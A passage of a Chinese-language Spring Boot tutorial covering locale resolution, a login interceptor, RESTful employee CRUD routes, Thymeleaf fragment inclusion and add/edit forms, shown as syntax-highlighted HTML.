class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="meta">@ConditionalOnMissingBean</span></span><br><span class="line"><span class="meta">@ConditionalOnProperty</span>(prefix = <span class="string">"spring.mvc"</span>, name = <span class="string">"locale"</span>)</span><br><span class="line"><span class="function"><span class="keyword">public</span> LocaleResolver <span class="title">localeResolver</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>.mvcProperties</span><br><span class="line">.getLocaleResolver() == WebMvcProperties.LocaleResolver.FIXED) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> FixedLocaleResolver(<span class="keyword">this</span>.mvcProperties.getLocale());</span><br><span class="line">&#125;</span><br><span class="line">AcceptHeaderLocaleResolver localeResolver = <span class="keyword">new</span> AcceptHeaderLocaleResolver();</span><br><span class="line">localeResolver.setDefaultLocale(<span class="keyword">this</span>.mvcProperties.getLocale());</span><br><span class="line"><span class="keyword">return</span> localeResolver;</span><br><span class="line">&#125;</span><br><span class="line">默认的就是根据请求头带来的区域信息获取Locale进行国际化</span><br></pre></td></tr></table></figure><p>4）、点击链接切换国际化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 可以在连接上携带区域信息</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyLocaleResolver</span> <span class="keyword">implements</span> <span class="title">LocaleResolver</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Locale <span class="title">resolveLocale</span><span class="params">(HttpServletRequest request)</span> </span>&#123;</span><br><span class="line">        String l = request.getParameter(<span class="string">"l"</span>);</span><br><span class="line">        Locale locale = Locale.getDefault();</span><br><span class="line">        <span class="keyword">if</span>(!StringUtils.isEmpty(l))&#123;</span><br><span class="line">            String[] split = l.split(<span class="string">"_"</span>);</span><br><span class="line">            locale = <span class="keyword">new</span> Locale(split[<span class="number">0</span>],split[<span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> locale;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setLocale</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Locale locale)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> <span class="meta">@Bean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> LocaleResolver <span class="title">localeResolver</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> MyLocaleResolver();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3）、登陆"><a href="#3）、登陆" class="headerlink" title="3）、登陆"></a>3）、登陆</h3><p>开发期间模板引擎页面修改以后，要实时生效</p><p>1）、禁用模板引擎的缓存</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 禁用缓存</span></span><br><span class="line">spring.thymeleaf.<span class="attribute">cache</span>=<span class="literal">false</span></span><br></pre></td></tr></table></figure><p>2）、页面修改完成以后ctrl+f9：重新编译；</p><p>登陆错误消息的显示</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">"color: red"</span> <span class="attr">th:text</span>=<span class="string">"$&#123;msg&#125;"</span> <span class="attr">th:if</span>=<span class="string">"$&#123;not #strings.isEmpty(msg)&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="4）、拦截器进行登陆检查"><a href="#4）、拦截器进行登陆检查" class="headerlink" title="4）、拦截器进行登陆检查"></a>4）、拦截器进行登陆检查</h3><p>拦截器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 登陆检查，</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LoginHandlerInterceptor</span> <span class="keyword">implements</span> <span class="title">HandlerInterceptor</span> </span>&#123;</span><br><span class="line">    <span class="comment">//目标方法执行之前</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">preHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Object user = request.getSession().getAttribute(<span class="string">"loginUser"</span>);</span><br><span class="line">        <span class="keyword">if</span>(user == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="comment">//未登陆，返回登陆页面</span></span><br><span class="line">            request.setAttribute(<span class="string">"msg"</span>,<span class="string">"没有权限请先登陆"</span>);</span><br><span class="line">            request.getRequestDispatcher(<span class="string">"/index.html"</span>).forward(request,response);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">//已登陆，放行请求</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">postHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">afterCompletion</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注册拦截器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//所有的WebMvcConfigurerAdapter组件都会一起起作用</span></span><br><span class="line">  <span class="meta">@Bean</span> <span class="comment">//将组件注册在容器</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> WebMvcConfigurerAdapter <span class="title">webMvcConfigurerAdapter</span><span class="params">()</span></span>&#123;</span><br><span class="line">      WebMvcConfigurerAdapter adapter = <span class="keyword">new</span> WebMvcConfigurerAdapter() &#123;</span><br><span class="line">          <span class="meta">@Override</span></span><br><span class="line">          <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addViewControllers</span><span class="params">(ViewControllerRegistry registry)</span> </span>&#123;</span><br><span class="line">              registry.addViewController(<span class="string">"/"</span>).setViewName(<span class="string">"login"</span>);</span><br><span class="line">              registry.addViewController(<span class="string">"/index.html"</span>).setViewName(<span class="string">"login"</span>);</span><br><span class="line">              registry.addViewController(<span class="string">"/main.html"</span>).setViewName(<span class="string">"dashboard"</span>);</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">//注册拦截器</span></span><br><span class="line">          <span class="meta">@Override</span></span><br><span class="line">          <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addInterceptors</span><span class="params">(InterceptorRegistry registry)</span> </span>&#123;</span><br><span class="line">              <span class="comment">//super.addInterceptors(registry);</span></span><br><span class="line">              <span class="comment">//静态资源；  *.css , *.js</span></span><br><span class="line">              <span class="comment">//SpringBoot已经做好了静态资源映射</span></span><br><span class="line">              registry.addInterceptor(<span class="keyword">new</span> LoginHandlerInterceptor()).addPathPatterns(<span class="string">"/**"</span>)</span><br><span class="line">                      .excludePathPatterns(<span class="string">"/index.html"</span>,<span class="string">"/"</span>,<span class="string">"/user/login"</span>);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;;</span><br><span class="line">      <span class="keyword">return</span> adapter;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h3 id="5）、CRUD-员工列表"><a href="#5）、CRUD-员工列表" class="headerlink" title="5）、CRUD-员工列表"></a>5）、CRUD-员工列表</h3><p>实验要求：</p><p>1）、RestfulCRUD：CRUD满足Rest风格；</p><p>URI：  /资源名称/资源标识       HTTP请求方式区分对资源CRUD操作</p><div class="table-container"><table><thead><tr><th></th><th>普通CRUD（uri来区分操作）</th><th>RestfulCRUD</th></tr></thead><tbody><tr><td>查询</td><td>getEmp</td><td>emp—-GET</td></tr><tr><td>添加</td><td>addEmp?xxx</td><td>emp—-POST</td></tr><tr><td>修改</td><td>updateEmp?id=xxx&amp;xxx=xx</td><td>emp/{id}—-PUT</td></tr><tr><td>删除</td><td>deleteEmp?id=1</td><td>emp/{id}—-DELETE</td></tr></tbody></table></div><p>2）、实验的请求架构;</p><div class="table-container"><table><thead><tr><th>实验功能</th><th>请求URI</th><th>请求方式</th></tr></thead><tbody><tr><td>查询所有员工</td><td>emps</td><td>GET</td></tr><tr><td>查询某个员工(来到修改页面)</td><td>emp/1</td><td>GET</td></tr><tr><td>来到添加页面</td><td>emp</td><td>GET</td></tr><tr><td>添加员工</td><td>emp</td><td>POST</td></tr><tr><td>来到修改页面（查出员工进行信息回显）</td><td>emp/1</td><td>GET</td></tr><tr><td>修改员工</td><td>emp</td><td>PUT</td></tr><tr><td>删除员工</td><td>emp/1</td><td>DELETE</td></tr></tbody></table></div><p>3）、员工列表：</p><h4 id="thymeleaf公共页面元素抽取"><a href="#thymeleaf公共页面元素抽取" class="headerlink" title="thymeleaf公共页面元素抽取"></a>thymeleaf公共页面元素抽取</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">1、抽取公共片段</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">th:fragment</span>=<span class="string">"copy"</span>&gt;</span></span><br><span class="line">&amp;copy; 2011 The Good Thymes Virtual Grocery</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">2、引入公共片段</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">th:insert</span>=<span class="string">"~&#123;footer :: copy&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">~&#123;templatename::selector&#125;：模板名::选择器</span><br><span class="line">~&#123;templatename::fragmentname&#125;:模板名::片段名</span><br><span class="line"></span><br><span class="line">3、默认效果：</span><br><span class="line">insert的公共片段在div标签中</span><br><span class="line">如果使用th:insert等属性进行引入，可以不用写~&#123;&#125;：</span><br><span class="line">行内写法可以加上：[[~&#123;&#125;]];[(~&#123;&#125;)]；</span><br></pre></td></tr></table></figure><p>三种引入公共片段的th属性：</p><p><strong>th:insert</strong>：将公共片段整个插入到声明引入的元素中</p><p><strong>th:replace</strong>：将声明引入的元素替换为公共片段</p><p><strong>th:include</strong>：将被引入的片段的内容包含进这个标签中</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">footer</span> <span class="attr">th:fragment</span>=<span class="string">"copy"</span>&gt;</span></span><br><span class="line">&amp;copy; 2011 The Good Thymes Virtual Grocery</span><br><span class="line"><span class="tag">&lt;/<span class="name">footer</span>&gt;</span></span><br><span class="line"></span><br><span class="line">引入方式</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">th:insert</span>=<span class="string">"footer :: copy"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">th:replace</span>=<span class="string">"footer :: copy"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">th:include</span>=<span class="string">"footer :: copy"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">效果</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">footer</span>&gt;</span></span><br><span class="line">    &amp;copy; 2011 The Good Thymes Virtual Grocery</span><br><span class="line">    <span class="tag">&lt;/<span class="name">footer</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">footer</span>&gt;</span></span><br><span class="line">&amp;copy; 2011 The Good Thymes Virtual Grocery</span><br><span class="line"><span class="tag">&lt;/<span class="name">footer</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">&amp;copy; 2011 The Good Thymes Virtual Grocery</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>引入片段的时候传入参数： </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">nav</span> <span class="attr">class</span>=<span class="string">"col-md-2 d-none d-md-block bg-light sidebar"</span> <span class="attr">id</span>=<span class="string">"sidebar"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"sidebar-sticky"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"nav flex-column"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"nav-item"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"nav-link active"</span></span></span><br><span class="line"><span class="tag">                   <span class="attr">th:class</span>=<span class="string">"$&#123;activeUri=='main.html'?'nav-link active':'nav-link'&#125;"</span></span></span><br><span class="line"><span class="tag">                   <span class="attr">href</span>=<span class="string">"#"</span> <span class="attr">th:href</span>=<span class="string">"@&#123;/main.html&#125;"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">svg</span> <span class="attr">xmlns</span>=<span class="string">"http://www.w3.org/2000/svg"</span> <span class="attr">width</span>=<span class="string">"24"</span> <span class="attr">height</span>=<span class="string">"24"</span> <span class="attr">viewBox</span>=<span class="string">"0 0 24 24"</span> <span class="attr">fill</span>=<span class="string">"none"</span> <span class="attr">stroke</span>=<span class="string">"currentColor"</span> <span class="attr">stroke-width</span>=<span class="string">"2"</span> <span class="attr">stroke-linecap</span>=<span class="string">"round"</span> <span class="attr">stroke-linejoin</span>=<span class="string">"round"</span> <span class="attr">class</span>=<span class="string">"feather feather-home"</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">path</span> <span class="attr">d</span>=<span class="string">"M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"</span>&gt;</span><span class="tag">&lt;/<span class="name">path</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">polyline</span> <span class="attr">points</span>=<span class="string">"9 22 9 12 15 12 15 22"</span>&gt;</span><span class="tag">&lt;/<span class="name">polyline</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br><span class="line">                    Dashboard <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"sr-only"</span>&gt;</span>(current)<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--引入侧边栏;传入参数--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">th:replace</span>=<span class="string">"commons/bar::#sidebar(activeUri='emps')"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="6）、CRUD-员工添加"><a href="#6）、CRUD-员工添加" class="headerlink" title="6）、CRUD-员工添加"></a>6）、CRUD-员工添加</h3><p>添加页面</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span>&gt;</span>LastName<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">placeholder</span>=<span class="string">"zhangsan"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span>&gt;</span>Email<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"email"</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">placeholder</span>=<span class="string">"zhangsan@atguigu.com"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span>&gt;</span>Gender<span class="tag">&lt;/<span class="name">label</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-check form-check-inline"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">"form-check-input"</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"gender"</span>  <span class="attr">value</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"form-check-label"</span>&gt;</span>男<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-check form-check-inline"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">"form-check-input"</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"gender"</span>  <span class="attr">value</span>=<span class="string">"0"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"form-check-label"</span>&gt;</span>女<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span>&gt;</span>department<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">select</span> <span class="attr">class</span>=<span class="string">"form-control"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">option</span>&gt;</span>1<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">option</span>&gt;</span>2<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">option</span>&gt;</span>3<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">option</span>&gt;</span>4<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">option</span>&gt;</span>5<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span>&gt;</span>Birth<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">placeholder</span>=<span class="string">"zhangsan"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">class</span>=<span class="string">"btn btn-primary"</span>&gt;</span>添加<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>提交的数据格式不对：生日：日期；</p><p>2017-12-12；2017/12/12；2017.12.12；</p><p>日期的格式化；SpringMVC将页面提交的值需要转换为指定的类型;</p><p>2017-12-12—-Date； 类型转换，格式化;</p><p>默认日期是按照/的方式；</p><h3 id="7）、CRUD-员工修改"><a href="#7）、CRUD-员工修改" class="headerlink" title="7）、CRUD-员工修改"></a>7）、CRUD-员工修改</h3><p>修改添加二合一表单</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--需要区分是员工修改还是添加；--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">th:action</span>=<span class="string">"@&#123;/emp&#125;"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--发送put请求修改员工数据--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">1、SpringMVC中配置HiddenHttpMethodFilter;（SpringBoot自动配置好的）</span></span><br><span class="line"><span class="comment">2、页面创建一个post表单</span></span><br><span class="line"><span class="comment">3、创建一个input项，name="_method";值就是我们指定的请求方式</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"_method"</span> <span class="attr">value</span>=<span class="string">"put"</span> <span class="attr">th:if</span>=<span class="string">"$&#123;emp!=null&#125;"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"id"</span> <span class="attr">th:if</span>=<span class="string">"$&#123;emp!=null&#125;"</span> <span class="attr">th:value</span>=<span class="string">"$&#123;emp.id&#125;"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span>&gt;</span>LastName<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"lastName"</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">placeholder</span>=<span class="string">"zhangsan"</span> <span class="attr">th:value</span>=<span class="string">"$&#123;emp!=null&#125;?$&#123;emp.lastName&#125;"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span>&gt;</span>Email<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"email"</span> <span 